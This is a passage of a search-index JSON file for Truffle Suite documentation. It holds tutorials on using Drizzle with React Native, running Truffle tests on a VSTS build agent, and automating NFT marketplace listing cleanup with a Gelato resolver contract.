( \"node-libs-react-native\" ); nodeLibs . vm = require . resolve ( \"vm-browserify\" ); module . exports = { resolver : { extraNodeModules : nodeLibs }, serializer : { // From https://github.com/facebook/react-native/blob/v0.57.7/rn-get-polyfills.js getPolyfills : () => [ /** * We omit RN's Object.assign polyfill * If we don't, then node_modules will be using RN's polyfill rather than ours. */ // require.resolve('react-native/Libraries/polyfills/Object.es6.js'), require . resolve ( 'react-native/Libraries/polyfills/console.js' ), require . resolve ( 'react-native/Libraries/polyfills/error-guard.js' ), require . resolve ( 'react-native/Libraries/polyfills/Number.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/String.prototype.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/Array.prototype.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/Array.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/Object.es7.js' ), ] } }; If you're wondering why we did all that in rn-cli.config.js , refer to this Gist for a great explanation. Finally let's import our shims in index.js . The very first line should be the following: import \"./shims\" We're now done with replacing all the global objects and functions that Drizzle was expecting.", "title": "Shimming web and node libraries on React Native"}, {"location": "guides/drizzle-and-react-native/#setting-up-the-smart-contract", "text": "To add our smart contract we'll just follow the previous tutorial on Drizzle and React. Do the steps from Writing our smart contract up to (and including) Migration .", "title": "Setting up the smart contract"}, {"location": "guides/drizzle-and-react-native/#connecting-your-app-to-your-ganache-testnet", "text": "When we're Working with React Native and mobile apps, accessing the Ganache server that's running on your machine takes a bit more work than when we are building web apps. The sections below detail how to connect to the Ganache testnet with your mobile device/emulator.", "title": "Connecting your app to your Ganache testnet"}, {"location": "guides/drizzle-and-react-native/#running-the-app", "text": "Start React Native Metro bundler: react-native start Start your emulator/plug in your device", "title": "Running the app"}, {"location": "guides/drizzle-and-react-native/#android-emulatorphysical-device", "text": "The main thing for Android devices is that we have to reverse the ports so that we can point to localhost on the Android device to the Ganache server. Make sure you've setup the Android Debug Bridge (adb) before doing these steps. Start ganache-cli : ganache-cli -b 3 Compile and migrate contracts: truffle compile && truffle migrate Reverse ports: adb reverse tcp:8545 tcp:8545 Install app: react-native run-android", "title": "Android (Emulator/Physical Device)"}, {"location": "guides/drizzle-and-react-native/#ios", "text": "", "title": "iOS"}, {"location": "guides/drizzle-and-react-native/#simulator", "text": "The iOS simulator will see servers on localhost just fine. Start ganache-cli : ganache-cli -b 3 Compile and migrate contracts: truffle compile && truffle migrate Install app: react-native run-ios (you can also do this through Xcode)", "title": "Simulator"}, {"location": "guides/drizzle-and-react-native/#physical-device", "text": "iOS physical devices involve the most manual work relative to other devices. You have to look up the local IP address of your machine and manually handle it every time it changes. Find your LOCAL_MACHINE_IP by checking your network settings on your Mac where Ganache is running Start ganache-cli : ganache-cli -b 3 -h LOCAL_MACHINE_IP In truffle.js for development , point Truffle to LOCAL_MACHINE_IP Compile and migrate contracts: truffle compile && truffle migrate In index.js , point Drizzle to LOCAL_MACHINE_IP const options = { ... web3 : { fallback : { type : \"ws\" , url : \"ws://LOCAL_MACHINE_IP:8545\" } } }; Install: Do it through Xcode", "title": "Physical device"}, {"location": "guides/drizzle-and-react-native/#setting-up-drizzle", "text": "Install Drizzle: yarn add drizzle Set up the Drizzle store by adding the following code to index.js : import React from \"react\" ; import { Drizzle , generateStore } from \"@drizzle/store\" ; import MyStringStore from \"./build/contracts/MyStringStore.json\" ; const options = { contracts : [ MyStringStore ] }; const drizzleStore = generateStore ( options ); const drizzle = new Drizzle ( options , drizzleStore ); AppRegistry . registerComponent ( appName , () => () => < App drizzle = { drizzle } /> ); Your index.js should look like this in the end: /** @format */ import \"./shims\" ; import { AppRegistry } from \"react-native\" ; import App from \"./app/App\" ; import { name as appName } from \"./app.json\" ; import React from \"react\" ; import { Drizzle , generateStore } from \"@drizzle/store\" ; import MyStringStore from \"./build/contracts/MyStringStore.json\" ; const options = { contracts : [ MyStringStore ] }; const drizzleStore = generateStore ( options ); const drizzle = new Drizzle ( options , drizzleStore ); AppRegistry . registerComponent ( appName , () => () => < App drizzle = { drizzle } /> );", "title": "Setting up Drizzle"}, {"location": "guides/drizzle-and-react-native/#wiring-up-the-app-component", "text": "This is pretty much the same as the web tutorial , but with React Native components instead of web ones. Refer to the web tutorial for a more in-depth explanation of what's going on. Let's create a folder called app in the root of the project. Add a file called App.js to it. In app/App.js , your code should look like this in the end: /** * Sample React Native App * https://github.com/facebook/react-native * * @format * @flow */ import React , { Component } from \"react\" ; import { Platform , StyleSheet , Text , View } from \"react-native\" ; type Props = {}; export default class App extends Component < Props > { state = { loading : true , drizzleState : null }; componentDidMount () { const { drizzle } = this . props ; this . unsubscribe = drizzle . store . subscribe (() => { const drizzleState = drizzle . store . getState (); if ( drizzleState . drizzleStatus . initialized ) { this . setState ({ loading : false , drizzleState }); } }); } componentWillUnmount () { this . unsubscribe (); } render () { return ( < View style = { styles . container } > { this . state . loading ? ( < Text > Loading Drizzle ... < /Text> ) : ( < View > < Text > Drizzle is ready < /Text> < /View> )} < /View> ); } } const styles = StyleSheet . create ({ container : { flex : 1 , justifyContent : \"center\" , alignItems : \"center\" , backgroundColor : \"#F5FCFF\" } }); Run the app, and you should see the string Loading Drizzle... while you wait for Drizzle to initialize. Once initialization is complete, the string Drizzle is ready should be visible.", "title": "Wiring up the App component"}, {"location": "guides/drizzle-and-react-native/#writing-a-component-to-read-from-drizzle", "text": "Once again, this is very similar to the web tutorial , just with React Native components. Add ReadString.js to the folder app . app/ReadString.js should look like this: import React from \"react\" ; import { Text } from \"react-native\" ; class ReadString extends React . Component { state = { dataKey : null }; componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to watch the `myString` method const dataKey = contract . methods [ \"myString\" ]. cacheCall (); // save the `dataKey` to local component state for later reference this . setState ({ dataKey }); } render () { // get the contract state from drizzleState const { MyStringStore } = this . props . drizzleState . contracts ; // using the saved `dataKey`, get the variable we're interested in const myString = MyStringStore . myString [ this . state . dataKey ]; // if it exists, then we display its value return < Text > My stored string : { myString && myString . value } < /Text>; } } export default ReadString ; Add it to App.js by modifying the render method: import ReadString from \"./ReadString\" ; // ... render () { return ( < View style = { styles . container } > { this . state . loading ? ( < Text > Loading ... < /Text> ) : ( < View > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /View> )} < /View> ); } You should now see the string Hello World being rendered after Drizzle has finished loading.", "title": "Writing a component to read from Drizzle"}, {"location": "guides/drizzle-and-react-native/#writing-a-component-to-write-to-the-smart-contract", "text": "Once again, this is very similar to the web tutorial , just with React Native components. Add SetString.js to the folder app . app/SetString.js should look like this: import React from \"react\" ; import { Text , View , Button , TextInput , StyleSheet } from \"react-native\" ; class SetString extends React . Component { state = { stackId : null , text : \"\" }; submit = () => { this . setValue ( this . state . text ); }; setValue = value => { const { drizzle , drizzleState } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to call the `set` method with `value` const stackId = contract . methods [ \"set\" ]. cacheSend ( value , { from : drizzleState . accounts [ 0 ] }); // save the `stackId` for later reference this . setState ({ stackId }); }; getTxStatus = () => { // get the transaction states from the drizzle state const { transactions , transactionStack } = this . props . drizzleState ; // get the transaction hash using our saved `stackId` const txHash = transactionStack [ this . state . stackId ]; // if transaction hash does not exist, don't display anything if ( ! txHash ) return null ; // otherwise, return the transaction status if ( transactions [ txHash ] && transactions [ txHash ]. status ) return `Transaction status: ${ transactions [ txHash ]. status } ` ; return null ; }; render () { return ( < View > < TextInput style = { styles . input } onChangeText = { text => this . setState ({ text })} value = { this . state . text } placeholder = \"Enter some text\" /> < Button title = \"Submit\" onPress = { this . submit } /> < Text > { this . getTxStatus ()} < /Text> < /View> ); } } const styles = StyleSheet . create ({ input : { height : 40 , borderColor : \"gray\" , borderWidth : 1 } }); export default SetString ; Add it to App.js by modifying the render function import ReadString from \"./ReadString\" ; import SetString from \"./SetString\" ; // ... render () { return ( < View style = { styles . container } > { this . state . loading ? ( < Text > Loading ... < /Text> ) : ( < View > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < SetString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /View> )} < /View> ); } Run the app, enter a new string, and press the Submit button. A transaction status of pending will show and change to success on completion. This string will persist through reloads of the app since it is connected to your Ganache testnet.", "title": "Writing a component to write to the smart contract"}, {"location": "guides/drizzle-and-react-native/#the-finish-line", "text": "Congratulations, you've just successfully integrated the full suite of Drizzle, Truffle, and Ganache tooling into your React Native dapp!", "title": "The Finish Line"}, {"location": "guides/ethereum-devops-truffle-testrpc-vsts/", "text": "Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Update : Since this tutorial was published, we have released Ganache , a personal blockchain and a replacement to the TestRPC. We have left this tutorial unaltered, but we highly recommend checking out our Ganache Documentation This post was originally published by David Burela on his blog Burela's House-o-blog . Big thanks to David for allowing us publish it here! I have been working on automating the compilation and testing of Ethereum solidity contracts, via the use of Truffle Suite . I\u2019ve got the test results being published back into the portal, allowing me to see on each commit if my code still compiles and passes my tests. I\u2019m assuming you already have a Truffle project locally that you want to automate the continuous builds & testing on. Follow the tutorial on installing Truffle & TestRPC on Windows . My final system will allow you to run \u201ctruffle test\u201d locally to see standard test output, but will modify the test runner on the server to output it as JUnit format. The Build system \u00b6 The system uses the Visual Studio Team Services (VSTS) build engine to automate this. You can sign up for free, and get unlimited private Git repos. You can have the code hosted on any Git provider. So either within VSTS itself, or GitHub, BitBucket, etc. Prepare truffle.js \u00b6 A pre-step is to define the test section in the truffle.js file mocha : { reporter : \u201c spec \u201d , reporterOptions : { mochaFile : \u2018 junitresults . xml \u2019 } } Create a build agent \u00b6 VSTS does provide hosted build agents, which are generic and can build standard .Net projects, Xamarin, etc. But because we are going to use npm packages installed globally on the box to handle the Truffle builds Create a new Windows VM (Can be your own hosted server, or Azure). e.g. Windows Server 2016 Datacentre edition on Azure Install the VSTS build agent. Instructions at https://www.visualstudio.com/en-us/docs/build/admin/agents/v2-windows Note: DON\u2019T select to run service as NT AUTHORITY\\NETWORK, this will not work with TestRPC (needs to open ports). Run the service as another user, or NT AUTHORITY\\SYSTEM Install chocolatey https://chocolatey.org/install Install these chocolatey packages $ choco install git -y $ choco install nodejs.install \u2013y Install npm packages (make sure you open a new PowerShell window so that node is in your path) $ npm install -g npm $ npm install -g \u2013production windows-build-tools $ npm install -g ethereumjs-testrpc $ npm install -g truffle $ npm install -g mocha $ npm install -g mocha-junit-reporter Restart the build agent so that all new paths are working Configure VSTS build \u00b6 Create a new variable with the path to where the npm global path is, for the user you installed the npm packages on above: variable name: npm.path variable value: path to npm packages e.g. C:\\Users\\<user>\\AppData\\Roaming\\npm Add 7 PowerShell tasks, and configure them like this \u00b6 Name: System version information Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path npm config set prefix $env:npm_path #only needs to be set once, will update for user #DEBUG #$env:path #npm list -g \u2013depth=0 #Display system information Write-Host \u201c System version information \u201d Write-Host -nonewline \u201c node version : \u201d ; node -v Write-Host -nonewline \u201c npm version : \u201c ; npm -v Write-Host -nonewline \u201c npm prefix : \u201c ; npm prefix -g Write-Host -nonewline \u201c truffle : \u201d ; truffle version Name: Config transform & test clean Script: # remove old test results rm .\\ junitresults . xml -ea SilentlyContinue # Modify the Truffle test runner to use the JUnit reporter Rename-Item .\\ truffle . js .\\ truffle_temp . js cat .\\ truffle_temp . js | % { $_ -replace \u2018 reporter : \u201c spec \u201d\u2018 , \u2018 reporter : \u201c mocha-junit-reporter \u201d\u2018 } | Out-File -Encoding ASCII .\\ truffle . js rm .\\ truffle_temp . js Name: Truffle build Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path #Truffle build truffle compile Name: Launch TestRPC Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path # launch the process echo \u201c launching TestRPC \u201d $testrpcProcess = Start-Process testrpc -passthru # persist the PID to disk and display in logs $testrpcProcess . Id | Export-CliXml testrpcPID . xml cat testrpcPID . xml Name: Run Truffle tests Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path # Run the tests truffle test Name: Shutdown TestRPC Other Settings: Enable \u201cAlways Run\u201d (to make sure it is shutdown if there is an error) Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path # retrieve the PID and kill the entire processs tree cat testrpcPID . xml $testrpcPID = Import-CliXml testrpcPID . xml taskkill / pid $testrpcPID / F / T Add a new Publish test result Test Result Format: JUnit Test Result Files: junitresults.xml Future work \u00b6 Things that I would like to add in the future: Figure out how to automate this on a Linux build agent (VSTS supports both Windows & Linux based build agents) Automate Release Management to run truffle migrate to push to a Bletchley test environment", "title": "Truffle Suite"}, {"location": "guides/ethereum-devops-truffle-testrpc-vsts/#the-build-system", "text": "The system uses the Visual Studio Team Services (VSTS) build engine to automate this. You can sign up for free, and get unlimited private Git repos. You can have the code hosted on any Git provider. So either within VSTS itself, or GitHub, BitBucket, etc.", "title": "The Build system"}, {"location": "guides/ethereum-devops-truffle-testrpc-vsts/#prepare-trufflejs", "text": "A pre-step is to define the test section in the truffle.js file mocha : { reporter : \u201c spec \u201d , reporterOptions : { mochaFile : \u2018 junitresults . xml \u2019 } }", "title": "Prepare truffle.js"}, {"location": "guides/ethereum-devops-truffle-testrpc-vsts/#create-a-build-agent", "text": "VSTS does provide hosted build agents, which are generic and can build standard .Net projects, Xamarin, etc. But because we are going to use npm packages installed globally on the box to handle the Truffle builds Create a new Windows VM (Can be your own hosted server, or Azure). e.g. Windows Server 2016 Datacentre edition on Azure Install the VSTS build agent. Instructions at https://www.visualstudio.com/en-us/docs/build/admin/agents/v2-windows Note: DON\u2019T select to run service as NT AUTHORITY\\NETWORK, this will not work with TestRPC (needs to open ports). Run the service as another user, or NT AUTHORITY\\SYSTEM Install chocolatey https://chocolatey.org/install Install these chocolatey packages $ choco install git -y $ choco install nodejs.install \u2013y Install npm packages (make sure you open a new PowerShell window so that node is in your path) $ npm install -g npm $ npm install -g \u2013production windows-build-tools $ npm install -g ethereumjs-testrpc $ npm install -g truffle $ npm install -g mocha $ npm install -g mocha-junit-reporter Restart the build agent so that all new paths are working", "title": "Create a build agent"}, {"location": "guides/ethereum-devops-truffle-testrpc-vsts/#configure-vsts-build", "text": "Create a new variable with the path to where the npm global path is, for the user you installed the npm packages on above: variable name: npm.path variable value: path to npm packages e.g. C:\\Users\\<user>\\AppData\\Roaming\\npm", "title": "Configure VSTS build"}, {"location": "guides/ethereum-devops-truffle-testrpc-vsts/#add-7-powershell-tasks-and-configure-them-like-this", "text": "Name: System version information Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path npm config set prefix $env:npm_path #only needs to be set once, will update for user #DEBUG #$env:path #npm list -g \u2013depth=0 #Display system information Write-Host \u201c System version information \u201d Write-Host -nonewline \u201c node version : \u201d ; node -v Write-Host -nonewline \u201c npm version : \u201c ; npm -v Write-Host -nonewline \u201c npm prefix : \u201c ; npm prefix -g Write-Host -nonewline \u201c truffle : \u201d ; truffle version Name: Config transform & test clean Script: # remove old test results rm .\\ junitresults . xml -ea SilentlyContinue # Modify the Truffle test runner to use the JUnit reporter Rename-Item .\\ truffle . js .\\ truffle_temp . js cat .\\ truffle_temp . js | % { $_ -replace \u2018 reporter : \u201c spec \u201d\u2018 , \u2018 reporter : \u201c mocha-junit-reporter \u201d\u2018 } | Out-File -Encoding ASCII .\\ truffle . js rm .\\ truffle_temp . js Name: Truffle build Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path #Truffle build truffle compile Name: Launch TestRPC Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path # launch the process echo \u201c launching TestRPC \u201d $testrpcProcess = Start-Process testrpc -passthru # persist the PID to disk and display in logs $testrpcProcess . Id | Export-CliXml testrpcPID . xml cat testrpcPID . xml Name: Run Truffle tests Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path # Run the tests truffle test Name: Shutdown TestRPC Other Settings: Enable \u201cAlways Run\u201d (to make sure it is shutdown if there is an error) Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path # retrieve the PID and kill the entire processs tree cat testrpcPID . xml $testrpcPID = Import-CliXml testrpcPID . xml taskkill / pid $testrpcPID / F / T Add a new Publish test result Test Result Format: JUnit Test Result Files: junitresults.xml", "title": "Add 7 PowerShell tasks, and configure them like this"}, {"location": "guides/ethereum-devops-truffle-testrpc-vsts/#future-work", "text": "Things that I would like to add in the future: Figure out how to automate this on a Linux build agent (VSTS supports both Windows & Linux based build agents) Automate Release Management to run truffle migrate to push to a Bletchley test environment", "title": "Future work"}, {"location": "guides/gelato-smart-contract-automation/", "text": "Web3 Unleashed: How to Automate Your Smart Contracts \u00b6 Written by Emily Lin Last updated 9/15/2022 Overview \u00b6 In this edition of Web3 Unleashed, we're interviewing Gelato Network co-founder Hilmar Orth about all things smart contract automation - what it is, how it's revolutionizing Web3 devOps, and how to do it! In this guide, we'll be building on our NFT rental marketplace we built last week . Specifically, we'll demonstrate how to use Gelato Ops to automate cleaning up our listings - that is, periodically removing unavailable listings. Watch the stream to learn more about Gelato's other offerings, such as their relay SDK . The completed code lives here . What is Gelato? \u00b6 Gelato Network takes away the need for web3 developers to manually manage smart contract processes. Specifically, it leverages a network of decentralized bots to automate transactions, taking the onus off developers to maintain complex systems that could result in a central point of failure, allowing them to dedicate more time to what matters most: building out dapps across DeFi, NFTs, gaming, DAOs, and whatever else the future of Web3 holds! Using Gelato Ops \u00b6 Gelato Ops is a nifty automation hub that allows users to create their automated tasks. Read more about it here . For our use case, our automated task relies on a dynamic argument Listing[] listings and will only be executed under the condition that there are listings that are no longer available to rent. Therefore, we need to write a resolver to solve our more complex use case. Download System Requirements \u00b6 You'll need to install: Node.js , v12 or higher truffle Create an Infura account and project \u00b6 To connect your DApp to the Goerli network, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it gelato-automation , and select Web3 API from the dropdown Register for a MetaMask wallet \u00b6 To interact with your DApp in the browser, you'll need a MetaMask wallet. You can download it and create one here . Download VS Code \u00b6 Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here . Get Some Test Eth \u00b6 In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Make sure you're getting test Eth for either Goerli or Sepolia. Set Up Your Project \u00b6 Since we're building on our NFT rental marketplace from episode 4, start by cloning the base repository. git clone https://github.com/trufflesuite/unleashed_nft_rental_marketplace.git gelato-demo We'll only be working with contracts, so hop into the truffle directory and install our package dependencies. cd gelato-demo/truffle npm i Write the automated task \u00b6 In our marketplace, we will remove listings that are no longer available. A listing becomes unavailable when the end date of the listing has passed. Add this method to Marketplace.sol : function removeUnavailableListings ( Listing [] memory unavailableListings ) public { for ( uint i = 0 ; i < unavailableListings . length ; i ++ ) { unlistNFT ( unavailableListings [ i ]. nftContract , unavailableListings [ i ]. tokenId ); } } It steps through a list of unavailable listings and calls our already written unlistNFT function, which will remove the NFT from our marketplace's list of listings and decrement the total number of listings available. Write IResolver \u00b6 Because our automated task takes in the dynamic argument unavailableListings and is dependent on on a few conditions, we'll need to write a resolver. The first thing we will do is create a resolver interface. This isn't explicitly necessary, but is good practice if you have to write multiple resolvers for different smart contracts. truffle create contract IResolver Then, paste in the following code: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; interface IResolver { function checker () external view returns ( bool canExec , bytes memory execPayload ); } And have Marketplace.sol extend that contract: import \"./IResolver.sol\" ; contract Marketplace is ReentrancyGuard , IResolver { Write the resolver \u00b6 Now, we can get to actually writing our resolver! It should return two things: bool canExec : whether Gelato should execute the task. bytes execPayload : data that executors should use for the execution. Add this method: function checker () external view override returns ( bool canExec , bytes memory execPayload ) { uint256 totalListingCount = _nftsListed . current (); uint256 unavailableListingCount = 0 ; Listing [] memory allListings = getAllListings (); for ( uint i = 0 ; i < totalListingCount ; i ++ ) { if ( allListings [ i ]. endDateUNIX > block . timestamp ) { unavailableListingCount ++ ; } } if ( unavailableListingCount <= 0 ) { return ( false , bytes ( \"No listings to unlist\" )); } if ( tx . gasprice > 80 gwei ) { return ( false , bytes ( \"Gas price is greater than 80 gwei\" )); } Listing [] memory unavailableListings = new Listing []( unavailableListingCount ); uint256 unavailableListingsCount = 0 ; for ( uint i = 0 ; i < totalListingCount ; i ++ ) { if ( allListings [ i ]. endDateUNIX > block . timestamp ) { unavailableListings [ unavailableListingsCount ] = allListings [ i ]; unavailableListingsCount ++ ; } } execPayload = abi . encodeWithSelector ( this . removeUnavailableListings . selector , unavailableListings ); return ( true , execPayload ); } Now, let's dive into the code. In order to construct our list of unavailable listings to pass into the automated task, we want to get the number of unavailable listings as follows: uint256 totalListingCount = _nftsListed . current (); uint256 unavailableListingCount = 0 ; Listing [] memory allListings = getAllListings (); for ( uint i = 0 ; i < totalListingCount ; i ++ ) { if ( allListings [ i ]. endDateUNIX > block . timestamp ) { unavailableListingCount ++ ; } } Next, since removing unavailable listings is contingent upon there being listings in the first place, we want to exit the resolver. In addition to returning false for canExec , we can also log the reason for the failure as follows: if ( unavailableListingCount <= 0 ) { return ( false , bytes ( \"No listings to unlist\" )); } if ( tx . gasprice > 80 gwei ) { return ( false , bytes ( \"Gas price is greater than 80 gwei\" )); } Also, notice that we included a gas limit. Since what we are automating is not necessarily time-sensitive, we can add in that check so we don't incur higher costs. In our example, we will be running the checker with every block. If you want the task to only check at a certain cadence, you can add a lastExecuted like in the docs . The last piece is actually constructing the list of unavailable listings and executing the automated task: Listing [] memory unavailableListings = new Listing []( unavailableListingCount ); uint256 unavailableListingsCount = 0 ; for ( uint i = 0 ; i < totalListingCount ; i ++ ) { if ( allListings [ i ]. endDateUNIX > block . timestamp ) { unavailableListings [ unavailableListingsCount ] = allListings [ i ]; unavailableListingsCount ++ ; } } execPayload = abi . encodeWithSelector ( this . removeUnavailableListings . selector , unavailableListings ); return ( true , execPayload ); To briefly explain abi.encodeWithSelector , the function selector is the first four bytes of Keccak-256 (SHA-3) hash of the function signature, which indicates the function to be called. This allows our automated task to be called with the appropriate parameters. So, we just end with returning (true, execPayload) to indicate what the task is and that it should be executed. Update unlistNFT \u00b6 Currently, unlistNFT can only be called by the owner of NFT or the marketplace contract address. Now that gelato is automating that task, we need to whitelist its address as well. You can see the list of contract addresses here . We'll be deploying on Goerli, so the address we will whitelist is 0xc1C6805B857Bef1f412519C4A842522431aFed39 . If you followed along in Web3 Unleashed episode 3 , you might remember learning about proxy contracts. In this case, the Gelato Ops contract is a proxy contract, so its address is constant despite its implementation contract potentially changing. Anyways, add the constant to the Marketplace.sol list of variables at the top address private constant GELATO_OPS_GOERLI = address(0xc1C6805B857Bef1f412519C4A842522431aFed39); . Then modify the require conditions to include the Ops contract address: require ( listing . owner == msg . sender || _marketOwner == msg . sender || GELATO_OPS_GOERLI == msg . sender , \"Not approved to unlist NFT\" ); Your final function should look like this: function unlistNFT ( address nftContract , uint256 tokenId ) public payable nonReentrant { Listing storage listing = _listingMap [ nftContract ][ tokenId ]; require ( listing . owner != address ( 0 ), \"This NFT is not listed\" ); require ( listing . owner == msg . sender || _marketOwner == msg . sender || GELATO_OPS_GOERLI == msg . sender , \"Not approved to unlist NFT\" ); // fee to be returned to user if unlisted before rental period is up // nothing to refund if no renter uint256 refund = 0 ; if ( listing . user != address ( 0 )) { refund = (( listing . expires - block . timestamp ) / 60 / 60 / 24 + 1 ) * listing . pricePerDay ; require ( msg . value >= refund , \"Not enough ether to cover refund\" ); payable ( listing . user ). transfer ( refund ); } // clean up data IERC4907 ( nftContract ). setUser ( tokenId , address ( 0 ), 0 ); EnumerableSet . remove ( _nftContractTokensMap [ nftContract ], tokenId ); delete _listingMap [ nftContract ][ tokenId ]; if ( EnumerableSet . length ( _nftContractTokensMap [ nftContract ]) == 0 ) { EnumerableSet . remove ( _nftContracts , nftContract ); } _nftsListed . decrement (); emit NFTUnlisted ( msg . sender , nftContract , tokenId , refund ); } Deploy the RentablePets contract to Goerli \u00b6 Let's deploy the contract to Goerli. Then, let's deploy it to the Goerli testnet using Truffle dashboard! To do so, let's add our Infura Goerli endpoint to our MetaMask wallet. First get your Infura endpoint from your Infura dashboard, and then navigate to Add Networks in MetaMask. Make sure your MetaMask wallet is connected to goerlidev and run: truffle dashboard truffle migrate --network dashboard This should bring up Truffle dashboard on localhost:24012 and prompt you to sign the deployment. Add the task to Gelato Ops \u00b6 Gelato has a super easy to use UI to automate your tasks. Navigate to the app and hit create task! It's pretty simple First, add your Marketplace contract address - because we didn't verify the contract, we'll have to manually add in the abi . To get this, go to Marketplace.json file in your contracts_build_directory . Alternatively, if you have the VS Code extension, you can directly access it there. Open it up, and copy in the ABI into the Gelato app and choose removeUnavailableListings as the function of choice to automate. Next, since we are using a resolver, choose Resolver and paste in the contract address and ABI, and then select checker as your resolver function. Note that Gelato will prompt you for a proxy contract. Since this is simple example, we don't need to check that off. Lastly, we have two options to pay. Go ahead and choose Gelato balance, name your task Remove Unavailable Listings , and create the task! Test the Task \u00b6 Let's go ahead and test the task. If we wait a bit without listing any NFTs, you'll notice that the resolver properly returns false and logs the appropriate message. To test this out, let's mint and list an NFT. Go to the run.js script and comment out the rent and unlist function call so when we call the script, we only list it. Additionally, we'll want to edit the end date for listing so that we can quickly cause a task execution. const RentableNft = artifacts . require ( \"RentableNft\" ); const Marketplace = artifacts . require ( \"Marketplace\" ); const TODAY = Math . floor ( Date . now () / 1000 ) + ( 60 * 60 ); const TOMORROW = TODAY + ( 24 * 60 * 60 ); const TOKEN_ID = 1 ; const PRICE = 1 ; const START = TODAY ; const END = TODAY + 500 ; const EXPIRES = TOMORROW ; const ERC721_ABI = [ { \"inputs\" : [{ \"internalType\" : \"address\" , \"name\" : \"to\" , \"type\" : \"address\" }, { \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" }], \"name\" : \"approve\" , \"outputs\" : [], \"stateMutability\" : \"nonpayable\" , \"type\" : \"function\" }, { \"inputs\" : [{ \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" }], \"name\" : \"ownerOf\" , \"outputs\" : [{ \"internalType\" : \"address\" , \"name\" : \"owner\" , \"type\" : \"address\" }], \"stateMutability\" : \"view\" , \"type\" : \"function\" }, { \"inputs\" : [ { \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" } ], \"name\" : \"userExpires\" , \"outputs\" : [ { \"internalType\" : \"uint256\" , \"name\" : \"\" , \"type\" : \"uint256\" } ], \"stateMutability\" : \"view\" , \"type\" : \"function\" , \"constant\" : true } ]; const main = async ( cb ) => { try { const nft = await RentableNft . deployed (); const NFT_CONTRACT = nft . address ; let txn = await nft . mint ( \"test\" ); console . log ( txn ); const marketplace = await Marketplace . deployed (); const listingFee = ( await marketplace . getListingFee ()). toString (); const nftContract = new web3 . eth . Contract ( ERC721_ABI , NFT_CONTRACT ); const owner = await nftContract . methods . ownerOf ( TOKEN_ID ). call (); txn = await nftContract . methods . approve ( marketplace . address , TOKEN_ID ). send ({ from : owner }); console . log ( txn ); txn = await marketplace . listNFT ( NFT_CONTRACT , TOKEN_ID , PRICE , START , END , { from : owner , value : listingFee }); console . log ( txn ); let value = (( EXPIRES - TODAY ) / 60 / 60 / 24 + 1 ) * PRICE ; let user = ( await web3 . eth . getAccounts ())[ 0 ]; // txn = await marketplace.rentNFT(NFT_CONTRACT, TOKEN_ID, EXPIRES, {from: user, value: value}); // console.log(txn); // value = (Math.floor((EXPIRES - Date.now()/1000)/60/60/24 + 1)) * PRICE; // let options = value < 0 ? {from: owner} : {from: owner, value: value}; // txn = await marketplace.unlistNFT(NFT_CONTRACT, TOKEN_ID, options); // console.log(txn); } catch ( err ) { console . log ( err ); } cb (); } module . exports = main ; `` Start the console by calling truffle console --dashboard and then call run.js using exec run.js . You'll need to sign 3 transactions: mint, approve, and list. If you don't want to do this manually through dashboard, you can opt to specify a goerli network in the truffle-config like this . You can quickly verify the NFT has been listed provided Gelato hasn't already executed your task as follows: truffle ( dashboard ) > let mp = await Marketplace.deployed () undefined truffle ( dashboard ) > mp.getAllListings () [ [ '0xA31618621805C9215B5Ade58EB09dBA8f32Bbdb8' , '0x0000000000000000000000000000000000000000' , '0xaa902bEc2FEa12bc2AD4F94D58CF7dF424e18f0d' , '1' , '1' , '1663244950' , '1663245450' , '0' , owner: '0xA31618621805C9215B5Ade58EB09dBA8f32Bbdb8' , user: '0x0000000000000000000000000000000000000000' , nftContract: '0xaa902bEc2FEa12bc2AD4F94D58CF7dF424e18f0d' , tokenId: '1' , pricePerDay: '1' , startDateUNIX: '1663244950' , endDateUNIX: '1663245450' , expires: '0' ] ] Now, we expect the resolver to pass true and execute the task. You can see it in the logs in your Gelato app: And reverify that the listing is unlisted by calling mp.getAllListings() truffle ( dashboard ) > mp.getAllListings () [] Future Extensions \u00b6 So, that's it! We've written a resolver and automated a task! For a more a detailed walkthrough of the code, be sure to watch the livestream on YouTube . Next episode we'll be covering decentralized streaming with Livepeer. Sign up for reminders for Web3 Unleashed here . If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, start a discussion here . If you want to show off what you built or just hang with the Unleashed community in general, join our Discord ! Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Web3 Unleashed: How to Automate Your Smart Contracts"}, {"location": 